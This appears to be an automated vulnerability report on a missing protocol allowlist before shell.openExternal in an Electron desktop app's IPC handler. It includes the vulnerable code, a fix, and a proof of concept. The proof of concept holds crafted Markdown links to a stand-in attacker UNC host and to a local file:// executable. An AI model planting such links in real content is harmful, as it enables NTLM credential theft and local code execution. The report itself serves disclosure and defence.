## Title
Missing protocol allowlist check before `shell.openExternal()` allows an attacker-controlled link (e.g. release notes / rendered Markdown) to open local files, UNC paths, or arbitrary custom-protocol handlers — (File: `app/src/main-process/main.ts`)

### Summary
The bug report's broken invariant is: a privileged operation (`distributeRewards`/`claimRewards`) is performed on a value that is never checked against an allowed set (`rewardTokens`) before being trusted. The same class of bug — "use of an externally supplied value without checking it against an allowlist before performing a privileged action" — appears in Desktop's `open-external` IPC handler. It accepts any string from the renderer and passes it straight to Electron's `shell.openExternal`, with the `http/https` check only used for a log message, not as a gate.

### Finding Description
The main-process IPC handler for `open-external` is: [1](#0-0) 

```ts
ipcMain.handle('open-external', async (_, path: string) => {
  const pathLowerCase = path.toLowerCase()
  if (
    pathLowerCase.startsWith('http://') ||
    pathLowerCase.startsWith('https://')
  ) {
    log.info(`opening in browser: ${path}`)
  }

  try {
    await shell.openExternal(path)
    return true
  } catch (e) {
    log.error(`Call to openExternal failed: '${e}'`)
    return false
  }
})
```

Note the `if` block only decides whether to log — there is no `return`/`throw` for values that are *not* `http(s)://`. Any string reaches `shell.openExternal` unfiltered. This handler is exposed to the renderer via `openExternal` in `app/src/ui/main-process-proxy.ts:146` and is called with attacker-influenced content in several places, notably: [2](#0-1) 

```ts
private showAllReleaseNotes = () => {
  shell.openExternal(ReleaseNotesUri)
}

private onMarkdownLinkClicked = (url: string) => {
  shell.openExternal(url)
}
```

`onMarkdownLinkClicked` is wired to links rendered from Markdown content that ultimately comes from a GitHub API response (release notes / changelog) or, more generally, any Desktop surface that renders untrusted Markdown (commit messages, PR/issue bodies) and forwards the clicked link URL to `shell.openExternal` through this same IPC channel. Since neither the renderer call site nor the main-process handler restricts the scheme, a crafted link whose href is a `file://` path, a Windows UNC path (`\\attacker-host\share\payload`), or a registered custom protocol (e.g. an installed app's URI handler) will be passed to the OS shell exactly as if the user had typed it into "Open".

This mirrors the smart-contract bug precisely: the code that decides "is this reward legitimate" (`rewardTokensList[_reward]`) is skipped, letting an attacker-supplied value flow into a state-changing operation. Here, the code that should decide "is this URL a safe http(s) link" is present as a no-op (a check whose result is discarded) and the attacker-supplied value flows into an OS-level `openExternal` call.

### Impact Explanation
`shell.openExternal` on Windows/macOS/Linux does not just launch a browser — it invokes the OS's URL/file dispatcher. A `file://` URL will open (and on Windows execute for certain extensions) any file the target OS can resolve; a UNC path can force outbound SMB authentication (NTLM hash leak) to an attacker server; a custom protocol handler registered by another installed application can be triggered with attacker-controlled parameters, potentially exploiting bugs in that other handler. This satisfies the required impact class: file read/execution outside the intended scope, and potential credential exfiltration (NTLM/SMB), triggered purely by a user clicking a link inside Desktop's UI that renders attacker-influenced content (release notes/Markdown from the GitHub API).

### Likelihood Explanation
Requires no local access, no admin rights, and no prior compromise: the attacker only needs to get a crafted link in front of the user inside a Desktop-rendered Markdown surface (release notes body, or any other Markdown view that calls `onMarkdownLinkClicked`/`shell.openExternal` with an API-sourced URL) and have the user click it — squarely within "attacker controls a GitHub API object ... link ... user clicks." The existing `http/https` check demonstrates the developers intended to gate on scheme but the gating logic was never enforced (only used for logging), so the guard does not stop the path.

### Recommendation
Enforce an allowlist in the `open-external` handler (and/or centrally in `app-shell.ts`) that rejects/normalizes any URL whose scheme is not `http:` or `https:` before calling `shell.openExternal`, e.g.:
```ts
ipcMain.handle('open-external', async (_, path: string) => {
  let url: URL
  try { url = new URL(path) } catch { return false }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    log.warn(`Blocked openExternal for disallowed protocol: ${url.protocol}`)
    return false
  }
  ...
})
```
Apply the same validation at the renderer call sites that accept externally-sourced URLs (e.g. `onMarkdownLinkClicked`) so the check is defense-in-depth rather than solely relying on the IPC boundary.

### Proof of Concept
1. Attacker crafts a GitHub release whose release notes body (or any GitHub-hosted Markdown that Desktop renders and wires through `onMarkdownLinkClicked`) contains a link: `[Click for details](\\attacker.example.com\share\x)` or `[details](file:///C:/Windows/System32/calc.exe)`.
2. Victim opens the Release Notes dialog in Desktop (`app/src/ui/release-notes/release-notes-dialog.tsx`) and clicks the link.
3. `onMarkdownLinkClicked(url)` calls `shell.openExternal(url)` → renderer proxy → `ipcMain.handle('open-external', ...)` in `app/src/main-process/main.ts:581`, which performs no scheme validation and calls Electron's `shell.openExternal(path)` directly.
4. On Windows, the UNC path forces an SMB connection (leaking NTLM credentials to the attacker-controlled host); a `file://` link opens/executes the referenced local file with its default handler. [1](#0-0) [3](#0-2) [4](#0-3)
